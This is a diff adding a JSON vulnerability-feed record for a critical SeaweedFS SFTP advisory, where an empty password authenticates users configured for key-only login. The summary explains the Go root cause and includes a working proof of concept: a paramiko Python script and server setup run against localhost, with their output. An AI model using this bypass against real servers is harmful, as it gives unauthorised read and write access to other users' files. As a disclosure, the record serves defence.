@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-q9rj-8p2j-whg4",
+  "aliases": [],
+  "title": "SFTP accepts an empty password for any user configured without a password (public-key-only users)",
+  "summary": "## Summary\n\nThe SeaweedFS SFTP server accepts an **empty password** as valid for any user whose stored password is empty - i.e. every user provisioned for public-key (or certificate) authentication only. Because `password` is in the default `-sftp.authMethods` list (`\"password,publickey\"`), a remote attacker who knows only a valid username can authenticate with a zero-length password and obtains a full SFTP session with that user's permissions and home-directory scope. No knowledge of any key or secret is required.\n\n**CWE:** CWE-287 Improper Authentication (contributing: CWE-1284 improper validation of the length of the compared secret).\n**Proposed CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 Critical.\n**Affected:** `<= 4.45` (`github.com/seaweedfs/seaweedfs`, Go). `weed sftp`, `weed server -sftp`, `weed filer -sftp`.\n\n## Root cause\n\n`weed/sftpd/user/filestore.go`:\n\n```go\nfunc (s *FileStore) ValidatePassword(username string, password []byte) bool {\n\tuser, err := s.GetUser(username)\n\tif err != nil {\n\t\treturn false\n\t}\n\treturn subtle.ConstantTimeCompare([]byte(user.Password), password) == 1\n}\n```\n\n`subtle.ConstantTimeCompare` returns `1` when both slices have equal length and content. For a public-key-only user `user.Password == \"\"`, so when the client sends an empty password the two zero-length slices compare equal and the function returns `true`.\n\nNothing upstream rejects the empty password: `weed/sftpd/auth/password.go` `PasswordAuthenticator.Authenticate` calls `ValidatePassword` directly with whatever the client sent; `weed/sftpd/auth/auth.go` wires `config.PasswordCallback` whenever `\"password\"` is in `enabledAuthMethods` (the default); and `golang.org/x/crypto/ssh` invokes `PasswordCallback` for a `password` auth request regardless of password length. `ValidatePublicKey` is not affected (an empty `PublicKeys` slice makes its loop return `false`).\n\n## Prerequisites\n\n- Network reach to the SFTP port (default `2022`).\n- `password` present in `-sftp.authMethods` (default is `password,publickey`).\n- At least one SFTP user configured without a password - the normal setup for key-based auth: the user-store JSON has `password` as optional and `publicKeys` as the alternative.\n- Knowledge of a valid username (often predictable - matches the home dir / tenant / service name).\n\n## Impact\n\nFull SFTP session as the targeted user: list / read / write / delete / rename within that user's permitted paths. For a user whose `permissions` grant broad access (or `homeDir: \"/\"`), this is read/write over the whole filer namespace.\n\n## Proof of concept\n\n`users.json` - one key-only user (no `password`), one with a password:\n\n```json\n[\n  { \"username\": \"keyonly\", \"publicKeys\": [\"ssh-ed25519 AAAA...\"],\n    \"homeDir\": \"/sftp/keyonly\", \"uid\": 1001, \"gid\": 1001,\n    \"permissions\": { \"/sftp/keyonly\": [\"read\",\"write\",\"list\"] } },\n  { \"username\": \"haspass\", \"password\": \"s3cret\",\n    \"homeDir\": \"/sftp/haspass\", \"uid\": 1002, \"gid\": 1002,\n    \"permissions\": { \"/sftp/haspass\": [\"read\",\"write\",\"list\"] } }\n]\n```\n\n```bash\nssh-keygen -t ed25519 -N '' -f hostkey && mkdir hk && mv hostkey hk/\nweed server -dir=/tmp/sw-data -ip=127.0.0.1 -filer -sftp -sftp.port=2022 \\\n  -sftp.hostKeysFolder=./hk -sftp.userStoreFile=./users.json\n```\n\n```python\nimport paramiko\nfor user, pw in [(\"keyonly\",\"\"), (\"keyonly\",\"wrong\"), (\"haspass\",\"\"), (\"haspass\",\"s3cret\")]:\n    t = paramiko.Transport((\"127.0.0.1\", 2022)); t.connect(hostkey=None)\n    try:\n        t.auth_password(user, pw); ok = t.is_authenticated()\n    except paramiko.ssh_exception.AuthenticationException:\n        ok = False\n    print(user, repr(pw), \"->\", \"OK\" if ok else \"denied\"); t.close()\n```\n\nObserved:\n\n```\nkeyonly ''      -> OK        <-- bug: empty password authenticated a key-only user\nkeyonly 'wrong' -> denied\nhaspass ''      -> denied\nhaspass 's3cret'-> OK\n```\n\nPost-auth, an `SFTPClient` over the same transport lists `/`, writes `/proof.txt`, and reads it back - full file access as `keyonly`.\n\n## Sugges...",
+  "published_at": "2026-09-23T00:00:12.000Z",
+  "modified_at": "2026-09-23T00:00:12.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.1,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-287",
+    "CWE-1284"
+  ],
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "4.45"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-q9rj-8p2j-whg4",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-q9rj-8p2j-whg4",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-q9rj-8p2j-whg4",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:ab67aec02633e20d6c5f7ec41fcf16a2152c5677ae7cfb05163be77f4a3d4db1",
+  "note": null
+}
